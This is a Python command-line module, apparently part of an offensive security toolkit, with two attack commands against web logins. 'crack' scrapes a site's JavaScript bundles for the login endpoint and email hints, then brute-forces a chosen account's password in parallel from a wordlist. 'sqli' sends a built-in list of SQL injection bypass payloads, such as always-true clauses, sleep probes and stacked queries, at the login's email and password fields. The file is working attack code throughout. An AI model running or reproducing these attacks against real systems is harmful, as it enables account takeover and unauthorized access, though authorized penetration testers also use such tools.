import re
import sys
import click
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn

console = Console()

WORDLISTS_DIR = Path(__file__).parent.parent / "wordlists"
DEFAULT_WORDLIST = WORDLISTS_DIR / "john_password.lst"


@click.group()
def password():
    """Password attacks — brute force, discovery."""
    pass


@password.command()
@click.option("-t", "--target", required=True, help="Target URL (site root or full login endpoint)")
@click.option("-u", "--user", required=True, help="Username / email to attack")
@click.option("-w", "--wordlist", default=str(DEFAULT_WORDLIST), show_default=True, help="Wordlist file")
@click.option("-p", "--range", "line_range", default=None, help="Line range, e.g. 4000-4100")
@click.option("-P", "--parallel", default=10, show_default=True, help="Parallel requests")
@click.option("-r", "--fail-code", default=401, show_default=True, help="HTTP code that means wrong password")
@click.option("-d", "--delay", default=0.0, show_default=True, help="Delay (seconds) between requests")
@click.option("-o", "--output", default=None, help="Save found credentials to file")
@click.option("-v", "--verbose", is_flag=True, help="Print every attempt")
def crack(target, user, wordlist, line_range, parallel, fail_code, delay, output, verbose):
    """Brute force a web login. Auto-discovers the endpoint from the JS bundle."""

    # Resolve endpoint
    if _looks_like_endpoint(target):
        endpoint = target
        console.print(f"[cyan][*][/cyan] Using endpoint: {endpoint}")
    else:
        console.print(f"[cyan][*][/cyan] Auto-discovering login endpoint for [bold]{target}[/bold]...")
        endpoint = _discover_endpoint(target)
        if not endpoint:
            console.print("[red][!] Could not auto-discover endpoint. Pass the full URL with -t.[/red]")
            sys.exit(1)
        console.print(f"[green][+][/green] Found endpoint: {endpoint}")

    # Load wordlist
    wl_path = Path(wordlist)
    if not wl_path.exists():
        console.print(f"[red][!] Wordlist not found: {wl_path}[/red]")
        sys.exit(1)

    passwords = _load_wordlist(wl_path, line_range)
    console.print(f"[cyan][*][/cyan] Loaded [bold]{len(passwords)}[/bold] passwords")
    console.print(f"[cyan][*][/cyan] Attacking [bold]{user}[/bold] with {parallel} parallel workers\n")

    found = []

    def try_password(pwd):
        try:
            resp = requests.post(
                endpoint,
                json={"email": user, "password": pwd},
                timeout=10,
                allow_redirects=False,
            )
            if resp.status_code != fail_code:
                return (pwd, resp.status_code, resp.text[:200])
        except requests.RequestException:
            pass
        return None

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TaskProgressColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("Cracking...", total=len(passwords))

        with ThreadPoolExecutor(max_workers=parallel) as executor:
            futures = {executor.submit(try_password, pwd): pwd for pwd in passwords}
            for future in as_completed(futures):
                pwd = futures[future]
                result = future.result()
                progress.advance(task)

                if result:
                    pwd, code, body = result
                    found.append(result)
                    console.print(f"\n[bold green]╔══ PASSWORD FOUND ══╗[/bold green]")
                    console.print(f"[bold green]  Email   :[/bold green] {user}")
                    console.print(f"[bold green]  Password:[/bold green] {pwd}")
                    console.print(f"[bold green]  HTTP    :[/bold green] {code}")
                    console.print(f"[bold green]  Body    :[/bold green] {body}")
                    console.print(f"[bold green]╚════════════════════╝[/bold green]\n")
                elif verbose:
                    console.print(f"[ ] {pwd}")

                if delay:
                    import time
                    time.sleep(delay)

    if found and output:
        out = Path(output)
        with out.open("w") as f:
            for pwd, code, body in found:
                f.write(f"user={user} password={pwd} http={code}\n")
        console.print(f"[green][+][/green] Results saved to {out}")

    if not found:
        console.print("[yellow][-] No credentials found.[/yellow]")


@password.command()
@click.option("-t", "--target", required=True, help="Target URL (site root or full login endpoint)")
@click.option("-u", "--user", default=None, help="Username / email (omit to also inject into the user field)")
@click.option("-r", "--fail-code", default=401, show_default=True, help="HTTP code that means failed login")
@click.option("-o", "--output", default=None, help="Save hits to file")
@click.option("-v", "--verbose", is_flag=True, help="Print every attempt")
def sqli(target, user, fail_code, output, verbose):
    """Test login endpoint for SQL injection bypass."""

    # Resolve endpoint
    if _looks_like_endpoint(target):
        endpoint = target
        console.print(f"[cyan][*][/cyan] Using endpoint: {endpoint}")
    else:
        console.print(f"[cyan][*][/cyan] Auto-discovering login endpoint for [bold]{target}[/bold]...")
        endpoint = _discover_endpoint(target)
        if not endpoint:
            console.print("[red][!] Could not auto-discover endpoint. Pass the full URL with -t.[/red]")
            sys.exit(1)
        console.print(f"[green][+][/green] Found endpoint: {endpoint}")

    payloads = _sqli_payloads()
    console.print(f"[cyan][*][/cyan] Testing [bold]{len(payloads)}[/bold] SQL injection payloads\n")

    found = []
    headers = {"Content-Type": "application/json"}

    for label, email_val, pass_val in payloads:
        # If a fixed user was provided, only inject into password field
        if user:
            email_val = user

        try:
            resp = requests.post(
                endpoint,
                json={"email": email_val, "password": pass_val},
                headers=headers,
                timeout=10,
                allow_redirects=False,
            )
        except requests.RequestException as e:
            console.print(f"[red][!] Request error: {e}[/red]")
            continue

        hit = resp.status_code != fail_code
        status_color = "green" if hit else "dim"

        if hit:
            found.append((label, email_val, pass_val, resp.status_code, resp.text[:300]))
            console.print(f"[bold green]╔══ SQLi HIT ══╗[/bold green]")
            console.print(f"[bold green]  Payload :[/bold green] {label}")
            console.print(f"[bold green]  Email   :[/bold green] {email_val}")
            console.print(f"[bold green]  Password:[/bold green] {pass_val}")
            console.print(f"[bold green]  HTTP    :[/bold green] {resp.status_code}")
            console.print(f"[bold green]  Body    :[/bold green] {resp.text[:200]}")
            console.print(f"[bold green]╚══════════════╝[/bold green]\n")
        elif verbose:
            console.print(f"[{status_color}][ ] {label}[/{status_color}]")

    if found and output:
        out = Path(output)
        with out.open("w") as f:
            for label, em, pw, code, body in found:
                f.write(f"payload={label!r} email={em!r} password={pw!r} http={code}\n")
        console.print(f"[green][+][/green] Results saved to {output}")

    if not found:
        console.print("[yellow][-] No SQLi bypass found.[/yellow]")


# ── Helpers ───────────────────────────────────────────────────────────────────

def _sqli_payloads() -> list[tuple[str, str, str]]:
    """Returns (label, email_value, password_value) tuples."""
    # Classic bypass payloads — injected into password field with a real-ish email
    dummy = "admin@admin.com"
    password_injections = [
        ("OR 1=1",                    dummy, "' OR '1'='1"),
        ("OR 1=1 --",                 dummy, "' OR 1=1--"),
        ("OR 1=1 #",                  dummy, "' OR 1=1#"),
        ("OR 1=1 /*",                 dummy, "' OR 1=1/*"),
        ("OR true --",                dummy, "' OR true--"),
        ("OR 'x'='x'",               dummy, "' OR 'x'='x"),
        ("\" OR \"1\"=\"1\"",         dummy, '" OR "1"="1'),
        ("\" OR 1=1 --",              dummy, '" OR 1=1--'),
        ("always-true bracket",       dummy, "') OR ('1'='1"),
        ("always-true bracket 2",     dummy, "') OR ('x'='x"),
        ("comment bypass",            dummy, "'--"),
        ("blank password trick",      dummy, "' OR ''='"),
        ("NULL bypass",               dummy, "' OR 1=1 OR ''='"),
        ("sleep probe (MySQL)",       dummy, "' OR SLEEP(1)--"),
        ("sleep probe (MSSQL)",       dummy, "'; WAITFOR DELAY '0:0:1'--"),
        ("stacked query",             dummy, "'; SELECT 1--"),
    ]

    # Also inject into email field with a benign password
    email_injections = [
        ("email OR 1=1 --",           "' OR 1=1--",          "anything"),
        ("email admin'--",            "admin'--",            "anything"),
        ("email OR true --",          "' OR true--",         "anything"),
        ("email \" OR 1=1 --",        '" OR 1=1--',          "anything"),
        ("email OR '1'='1",           "' OR '1'='1",         "anything"),
    ]

    # Both fields injected
    both_injections = [
        ("both fields",               "' OR '1'='1",         "' OR '1'='1"),
    ]

    return password_injections + email_injections + both_injections



def _looks_like_endpoint(url: str) -> bool:
    """Heuristic: does the URL already point to a specific endpoint?"""
    path = url.split("://", 1)[-1].split("/", 1)[-1] if "/" in url.split("://", 1)[-1] else ""
    return len(path.split("/")) >= 2 and any(
        kw in url.lower() for kw in ["login", "auth", "signin", "session", "token"]
    )


def _discover_endpoint(base_url: str) -> str | None:
    """Fetch the site, find JS bundles, extract the login endpoint."""
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    origin = re.match(r"https?://[^/]+", base_url).group()

    try:
        html = requests.get(base_url, headers=headers, timeout=10).text
    except requests.RequestException as e:
        console.print(f"[red][!] Failed to fetch {base_url}: {e}[/red]")
        return None

    js_srcs = re.findall(r'src="([^"]+\.js)"', html)
    if not js_srcs:
        console.print("[yellow][!] No JS bundles found in page.[/yellow]")
        return None

    for src in js_srcs:
        bundle_url = src if src.startswith("http") else f"{origin}{src}"
        console.print(f"[dim]    Scanning {bundle_url}[/dim]")

        try:
            bundle = requests.get(bundle_url, headers=headers, timeout=15).text
        except requests.RequestException:
            continue

        # Find email hints
        emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', bundle)
        emails = [e for e in emails if not any(x in e for x in ["example", "test", "noreply"])]
        if emails:
            console.print(f"[green][+][/green] Email hint found in bundle: [bold]{emails[0]}[/bold]")

        # Find API base (e.g. "/api")
        api_base = ""
        m = re.search(r'["\`]Wn\s*=\s*["\`](/[a-z]{1,10})["\`]|["\`](/api[^"\`]{0,20})["\`]', bundle)
        if m:
            api_base = m.group(1) or m.group(2) or ""

        # Find login path from post() calls
        login_paths = re.findall(r'post\(["\`](/[^"\`]{1,60})["\`]', bundle)
        for path in login_paths:
            if any(kw in path.lower() for kw in ["login", "auth", "signin", "session"]):
                return f"{origin}{api_base}{path}"

    return None


def _load_wordlist(path: Path, line_range: str | None) -> list[str]:
    lines = [l.rstrip("\n") for l in path.open(encoding="latin-1") if not l.startswith("#") and l.strip()]
    if line_range:
        start, end = (int(x) for x in line_range.split("-"))
        lines = lines[start - 1:end]
    return lines
